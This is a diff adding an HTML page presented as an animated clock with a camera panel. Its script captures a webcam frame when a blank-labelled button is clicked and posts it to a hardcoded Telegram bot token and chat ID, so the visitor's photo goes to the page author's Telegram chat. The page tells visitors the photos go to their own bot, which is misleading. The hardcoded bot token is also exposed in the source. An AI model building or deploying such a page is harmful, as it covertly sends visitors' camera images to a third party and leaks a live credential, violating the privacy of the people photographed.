@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Đồng Hồ 10 Màu Chậm - Camera & Chụp Ảnh Gửi Telegram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+        }
+
+        body {
+            min-height: 100vh;
+            background: linear-gradient(145deg, #0a0f1e 0%, #0c1222 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', 'Poppins', 'Montserrat', system-ui, -apple-system, 'Roboto', monospace;
+            padding: 20px;
+            position: relative;
+        }
+
+        .container {
+            position: relative;
+            z-index: 2;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 30px;
+            width: 100%;
+            max-width: 700px;
+        }
+
+        /* Khung đồng hồ với viền gradient động 10 màu */
+        .clock-wrapper {
+            background: rgba(10, 15, 30, 0.55);
+            backdrop-filter: blur(4px);
+            border-radius: 80px;
+            padding: 20px 30px;
+            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.4), inset 0 1px 1px rgba(255, 255, 255, 0.1);
+        }
+
+        .clock-face {
+            background: #03050a;
+            border-radius: 60px;
+            padding: 30px 35px;
+            box-shadow: inset 0 5px 12px rgba(0, 0, 0, 0.6), 0 8px 18px rgba(0, 0, 0, 0.3);
+        }
+
+        .time-display {
+            font-size: clamp(2.8rem, 12vw, 5.8rem);
+            font-weight: 700;
+            font-family: 'Courier New', 'Fira Mono', 'JetBrains Mono', monospace;
+            letter-spacing: 6px;
+            background: linear-gradient(135deg, #eef2ff, #cbd5ff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+            text-align: center;
+        }
+
+        /* Thanh màu gradient chuyển động 10 màu chậm */
+        .animated-border {
+            position: relative;
+            border-radius: 80px;
+            background: linear-gradient(270deg, 
+                #ff3c00, #ffb347, #fff94c, #5eff5e, #2ad4ff, 
+                #4c6eff, #b74cff, #ff4c9e, #ff6a4c, #ffd966, #ff3c00);
+            background-size: 400% 400%;
+            animation: slowHueFlow 18s ease infinite;
+            padding: 4px;
+        }
+
+        @keyframes slowHueFlow {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        /* Khu vực camera */
+        .camera-section {
+            width: 100%;
+            background: linear-gradient(125deg, #101624, #1b1f32, #191e30, #0f1422);
+            background-size: 300% 300%;
+            animation: slowBgFlow 22s ease infinite;
+            backdrop-filter: blur(12px);
+            border-radius: 48px;
+            padding: 20px 20px 25px;
+            box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        @keyframes slowBgFlow {
+            0% { background-position: 0% 30%; }
+            50% { background-position: 100% 70%; }
+            100% { background-position: 0% 30%; }
+        }
+
+        .cam-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: baseline;
+            flex-wrap: wrap;
+            margin-bottom: 18px;
+            padding: 0 8px;
+        }
+
+        .cam-title {
+            color: white;
+            font-weight: 600;
+            font-size: 1.3rem;
+            letter-spacing: 1px;
+            background: linear-gradient(120deg, #f0f3ff, #c0d0ff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .cam-status {
+            font-size: 0.8rem;
+            background: #1e2a3a80;
+            padding: 5px 12px;
+            border-radius: 60px;
+            color: #ccdeff;
+            font-weight: 500;
+        }
+
+        .video-container {
+            position: relative;
+            width: 100%;
+            border-radius: 32px;
+            overflow: hidden;
+            background: #000000aa;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+            aspect-ratio: 4 / 3;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(1);
+            transition: opacity 0.3s;
+        }
+
+        .placeholder-cam {
+            position: absolute;
+            color: #b9c2e6;
+            font-size: 1rem;
+            text-align: center;
+            background: #01010180;
+            padding: 12px 20px;
+            border-radius: 48px;
+            backdrop-filter: blur(4px);
+            pointer-events: none;
+        }
+
+        canvas {
+            display: none;
+        }
+
+        .cam-controls {
+            margin-top: 20px;
+            display: flex;
+            justify-content: center;
+            gap: 18px;
+            flex-wrap: wrap;
+        }
+
+        button {
+            background: linear-gradient(135deg, #232a3f, #141b2b);
+            border: none;
+            padding: 12px 28px;
+            border-radius: 60px;
+            font-weight: 600;
+            font-size: 1rem;
+            color: #eaf0ff;
+            cursor: pointer;
+            backdrop-filter: blur(4px);
+            transition: 0.2s;
+            box-shadow: 0 5px 12px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            font-family: inherit;
+        }
+
+        button:active {
+            transform: scale(0.96);
+        }
+
+        button.primary {
+            background: linear-gradient(115deg, #3a4c8c, #1f2c4f);
+            box-shadow: 0 6px 14px rgba(30, 80, 200, 0.3);
+            color: white;
+        }
+
+        button.danger {
+            background: linear-gradient(115deg, #642b3c, #3d1a28);
+            border-color: #ff7f8f80;
+        }
+
+        button.telegram-btn {
+            background: linear-gradient(115deg, #2a6b9e, #1c4e73);
+            border-color: #4aa3df80;
+        }
+
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .toast-msg {
+            position: fixed;
+            bottom: 25px;
+            left: 50%;
+            transform: translateX(-50%) scale(0.9);
+            background: #0f172ad9;
+            backdrop-filter: blur(12px);
+            padding: 10px 25px;
+            border-radius: 60px;
+            color: #ffefb9;
+            font-size: 0.85rem;
+            font-weight: 500;
+            z-index: 100;
+            transition: 0.2s;
+            opacity: 0;
+            pointer-events: none;
+            border-left: 4px solid #ffb347;
+            white-space: nowrap;
+            font-family: monospace;
+        }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.6s linear infinite;
+            margin-right: 8px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 550px) {
+            .clock-wrapper {
+                padding: 12px 18px;
+            }
+            .clock-face {
+                padding: 18px 20px;
+            }
+            .time-display {
+                letter-spacing: 2px;
+            }
+            button {
+                padding: 8px 18px;
+                font-size: 0.85rem;
+            }
+            .toast-msg {
+                white-space: normal;
+                text-align: center;
+                width: 90%;
+                font-size: 0.75rem;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- Đồng hồ với viền 10 màu chuyển động chậm -->
+    <div class="animated-border">
+        <div class="clock-wrapper">
+            <div class="clock-face">
+                <div class="time-display" id="clockDisplay">
+                    00:00:00
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Khu vực Camera + Chụp ảnh Telegram -->
+    <div class="camera-section">
+        <div class="cam-header">
+            <span class="cam-title">📸 CAMERA & TELEGRAM</span>
+            <span class="cam-status" id="camStatusText">🔴 Chưa kết nối</span>
+        </div>
+        <div class="video-container">
+            <video id="videoElement" autoplay playsinline muted></video>
+            <canvas id="photoCanvas" style="display: none;"></canvas>
+            <div id="placeholderCam" class="placeholder-cam">
+                📷 Nhấn "Bật Camera" để hiển thị hình ảnh
+            </div>
+        </div>
+        <div class="cam-controls">
+            <button id="enableCamBtn" class="primary">📹 BẬT CAMERA</button>
+            <button id="disableCamBtn" class="danger">⛔ TẮT CAMERA</button>
+            <button id="captureTelegramBtn" class="telegram-btn" disabled>📸  </button>
+        </div>
+        <div style="font-size: 0.7rem; text-align: center; margin-top: 12px; color: #9aa9cf;">
+            🔒 Yêu cầu quyền truy cập camera | Ảnh sẽ gửi đến Telegram Bot của bạn
+        </div>
+    </div>
+</div>
+
+<div id="toastMsg" class="toast-msg">✨ Thông báo</div>
+
+<script>
+    (function() {
+        // ==================== CẤU HÌNH TELEGRAM ====================
+        // ⚠️ QUAN TRỌNG: Thay thế bằng token và chat_id thực của bạn!
+        // Lấy chat_id: gửi tin nhắn tới bot @userinfobot hoặc tới bot của bạn rồi gọi getUpdates
+        const BOT_TOKEN = "8677995221:AAEmsO71OlTS4PY7ML9md9XA-5PRAbQyfMI";      // 👈 THAY BẰNG TOKEN CỦA BẠN
+        const CHAT_ID = "7211752234";          // 👈 THAY BẰNG CHAT_ID CỦA BẠN
+        
+        // Kiểm tra cấu hình
+        const isTelegramConfigured = BOT_TOKEN !== "YOUR_BOT_TOKEN" && CHAT_ID !== "YOUR_CHAT_ID";
+        
+        // ==================== ĐỒNG HỒ ====================
+        const clockEl = document.getElementById('clockDisplay');
+        
+        function updateClock() {
+            const now = new Date();
+            const hours = now.getHours().toString().padStart(2, '0');
+            const minutes = now.getMinutes().toString().padStart(2, '0');
+            const seconds = now.getSeconds().toString().padStart(2, '0');
+            clockEl.innerText = `${hours}:${minutes}:${seconds}`;
+        }
+        
+        updateClock();
+        setInterval(updateClock, 1000);
+        
+        // Hiệu ứng nhấp nháy nhẹ cho đồng hồ mỗi giây
+        let lastSec = -1;
+        setInterval(() => {
+            const sec = new Date().getSeconds();
+            if (sec !== lastSec) {
+                lastSec = sec;
+                clockEl.style.transform = 'scale(1.01)';
+                setTimeout(() => { clockEl.style.transform = 'scale(1)'; }, 100);
+            }
+        }, 200);
+        clockEl.style.transition = 'transform 0.08s linear';
+        
+        // ==================== CAMERA LOGIC ====================
+        const video = document.getElementById('videoElement');
+        const photoCanvas = document.getElementById('photoCanvas');
+        const enableBtn = document.getElementById('enableCamBtn');
+        const disableBtn = document.getElementById('disableCamBtn');
+        const captureTelegramBtn = document.getElementById('captureTelegramBtn');
+        const camStatusSpan = document.getElementById('camStatusText');
+        const placeholderDiv = document.getElementById('placeholderCam');
+        const toastMsgDiv = document.getElementById('toastMsg');
+        
+        let mediaStream = null;
+        let isCameraActive = false;
+        
+        function showMessage(text, isError = false) {
+            toastMsgDiv.innerText = text;
+            toastMsgDiv.style.opacity = '1';
+            toastMsgDiv.style.borderLeftColor = isError ? '#ff6a6a' : '#6effa8';
+            toastMsgDiv.style.background = isError ? '#2f1a1ad9' : '#0f172ad9';
+            setTimeout(() => {
+                toastMsgDiv.style.opacity = '0';
+            }, 3000);
+        }
+        
+        function updateCameraUI() {
+            if (isCameraActive && mediaStream && mediaStream.active) {
+                placeholderDiv.style.display = 'none';
+                camStatusSpan.innerHTML = '🟢 Đang hoạt động';
+                camStatusSpan.style.color = '#aaffdd';
+                captureTelegramBtn.disabled = false;
+            } else {
+                placeholderDiv.style.display = 'flex';
+                camStatusSpan.innerHTML = mediaStream === null ? '🔴 Chưa kết nối' : '⚫ Camera tắt';
+                camStatusSpan.style.color = '#ffb7b2';
+                captureTelegramBtn.disabled = true;
+            }
+            
+            // Nếu chưa cấu hình Telegram thì vẫn disable nút chụp và thông báo
+            if (!isTelegramConfigured && captureTelegramBtn.disabled === false) {
+                captureTelegramBtn.disabled = true;
+                captureTelegramBtn.title = "Vui lòng cấu hình BOT_TOKEN và CHAT_ID trong mã nguồn";
+            }
+        }
+        
+        async function stopCamera() {
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+                mediaStream = null;
+            }
+            video.srcObject = null;
+            isCameraActive = false;
+            updateCameraUI();
+            showMessage('📴 Đã tắt camera', false);
+        }
+        
+        async function startCamera() {
+            if (mediaStream) {
+                await stopCamera();
+            }
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                mediaStream = stream;
+                video.srcObject = stream;
+                isCameraActive = true;
+                updateCameraUI();
+                showMessage('✅ Camera đã được bật!', false);
+                
+                video.onloadedmetadata = () => {
+                    video.play().catch(e => console.warn(e));
+                };
+            } catch (err) {
+                console.error('Camera error:', err);
+                let errorMsg = '❌ Không thể truy cập camera. ';
+                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+                    errorMsg += 'Bạn đã từ chối quyền truy cập camera. Hãy cấp quyền và thử lại.';
+                } else if (err.name === 'NotFoundError') {
+                    errorMsg += 'Không tìm thấy camera trên thiết bị.';
+                } else if (err.name === 'NotReadableError') {
+                    errorMsg += 'Camera đang được sử dụng bởi ứng dụng khác.';
+                } else {
+                    errorMsg += err.message;
+                }
+                showMessage(errorMsg, true);
+                isCameraActive = false;
+                mediaStream = null;
+                video.srcObject = null;
+                updateCameraUI();
+            }
+        }
+        
+        // ==================== CHỤP ẢNH & GỬI TELEGRAM ====================
+        async function captureAndSendToTelegram() {
+            if (!isCameraActive || !mediaStream || !mediaStream.active) {
+                showMessage('⚠️ Vui lòng bật camera trước khi chụp ảnh', true);
+                return;
+            }
+            
+            if (!isTelegramConfigured) {
+                showMessage('⚠️ Chưa cấu hình Telegram Bot! Vui lòng đặt BOT_TOKEN và CHAT_ID trong mã nguồn', true);
+                return;
+            }
+            
+            // Hiển thị trạng thái loading trên nút
+            const originalBtnText = captureTelegramBtn.innerHTML;
+            captureTelegramBtn.innerHTML = '<span class="loading-spinner"></span> Đang gửi...';
+            captureTelegramBtn.disabled = true;
+            
+            try {
+                // 1. Chụp ảnh từ video
+                const videoTrack = mediaStream.getVideoTracks()[0];
+                const settings = videoTrack.getSettings();
+                const width = settings.width || video.videoWidth || 640;
+                const height = settings.height || video.videoHeight || 480;
+                
+                photoCanvas.width = width;
+                photoCanvas.height = height;
+                const ctx = photoCanvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, width, height);
+                
+                // 2. Chuyển canvas thành blob (JPEG)
+                const blob = await new Promise((resolve) => {
+                    photoCanvas.toBlob(resolve, 'image/jpeg', 0.85);
+                });
+                
+                if (!blob) {
+                    throw new Error('Không thể tạo ảnh');
+                }
+                
+                // 3. Tạo form data để gửi lên Telegram Bot API
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'snapshot.jpg');
+                
+                // Lấy thời gian hiện tại để làm caption
+                const now = new Date();
+                const timeStr = now.toLocaleString('vi-VN', { hour12: false });
+                const caption = `🕐 ${timeStr}\n📸 Chụp từ đồng hồ 10 màu`;
+                formData.append('caption', caption);
+                
+                // 4. Gửi request tới Telegram API
+                const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+                
+                const response = await fetch(apiUrl, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await response.json();
+                
+                if (result.ok) {
+                    showMessage('✅ Đã gửi ảnh thành công đến Telegram!', false);
+                } else {
+                    console.error('Telegram API error:', result);
+                    let errorDetail = result.description || 'Lỗi không xác định';
+                    if (errorDetail.includes('chat not found') || errorDetail.includes('bot was blocked')) {
+                        errorDetail = 'Sai CHAT_ID hoặc bot chưa được khởi tạo với user này';
+                    }
+                    throw new Error(errorDetail);
+                }
+                
+            } catch (error) {
+                console.error('Lỗi chụp/gửi:', error);
+                showMessage(`❌ Gửi thất bại: ${error.message}`, true);
+            } finally {
+                // Khôi phục nút
+                captureTelegramBtn.innerHTML = originalBtnText;
+                // Chỉ enable lại nếu camera vẫn đang hoạt động và telegram đã cấu hình
+                if (isCameraActive && isTelegramConfigured) {
+                    captureTelegramBtn.disabled = false;
+                } else {
+                    captureTelegramBtn.disabled = true;
+                }
+            }
+        }
+        
+        // ==================== GẮN SỰ KIỆN ====================
+        enableBtn.addEventListener('click', startCamera);
+        disableBtn.addEventListener('click', stopCamera);
+        captureTelegramBtn.addEventListener('click', captureAndSendToTelegram);
+        
+        // Kiểm tra hỗ trợ camera
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            enableBtn.disabled = true;
+            enableBtn.style.opacity = '0.6';
+            camStatusSpan.innerHTML = '⚠️ Không hỗ trợ camera';
+            showMessage('Trình duyệt không hỗ trợ truy cập camera', true);
+        }
+        
+        // Cảnh báo nếu chưa cấu hình Telegram
+        if (!isTelegramConfigured) {
+            captureTelegramBtn.disabled = true;
+            captureTelegramBtn.title = 'Cần cấu hình BOT_TOKEN và CHAT_ID';
+            showMessage('⚠️ Vui lòng cấu hình BOT_TOKEN và CHAT_ID của Telegram Bot trong mã nguồn (dòng 260-265)', true);
+            console.warn('⚠️ TELEGRAM CHƯA CẤU HÌNH: Vui lòng thay YOUR_BOT_TOKEN và YOUR_CHAT_ID');
+        } else {
+            showMessage('✨ Đã sẵn sàng! Bật camera và chụp ảnh gửi Telegram', false);
+        }
+        
+        // Khởi tạo UI
+        updateCameraUI();
+        
+        // Dọn dẹp khi thoát
+        window.addEventListener('beforeunload', () => {
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+            }
+        });
+        
+        // Thêm hướng dẫn cấu hình trong console
+        console.log('%c🔧 HƯỚNG DẪN CẤU HÌNH TELEGRAM', 'color: #ffb347; font-size: 14px; font-weight: bold;');
+        console.log('1. Tạo bot tại @BotFather trên Telegram, lấy token');
+        console.log('2. Lấy chat_id: gửi tin nhắn tới bot, truy cập https://api.telegram.org/bot<TOKEN>/getUpdates');
+        console.log('3. Thay YOUR_BOT_TOKEN và YOUR_CHAT_ID trong biến BOT_TOKEN, CHAT_ID (dòng ~260-265)');
+        
+        // Thêm hiệu ứng cho nút telegram nếu chưa cấu hình
+        if (!isTelegramConfigured) {
+            const style = document.createElement('style');
+            style.textContent = `
+                button.telegram-btn:disabled {
+                    background: linear-gradient(115deg, #4a4a6e, #2a2a4a);
+                    opacity: 0.6;
+                }
+            `;
+            document.head.appendChild(style);
+        }
+    })();
+</script>
+</body>
+</html>
